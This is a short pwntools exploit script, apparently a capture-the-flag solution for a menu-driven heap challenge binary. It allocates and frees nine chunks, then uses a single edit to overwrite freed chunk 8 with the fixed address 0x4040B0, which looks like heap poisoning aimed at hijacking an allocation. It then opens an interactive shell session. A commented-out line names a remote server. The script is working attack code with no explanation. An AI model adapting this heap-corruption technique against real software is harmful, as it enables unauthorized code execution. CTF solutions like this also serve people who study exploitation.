from pwn import*
def add(idx):
    p.sendlineafter('choice?','1')
    p.sendlineafter('idx?\n',str(idx))
def edit(idx,content): #Just Once
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(content)
def free(idx):
    p.sendline('3')
    p.sendline(str(idx))
#p = remote('123.56.85.29',4205)
p = process('./pwn')
for i in range(9):
	add(i)
for i in range(9):
	free(i)
add(9)
edit(8,p64(0x4040B0))
p.sendline('6')
p.interactive()
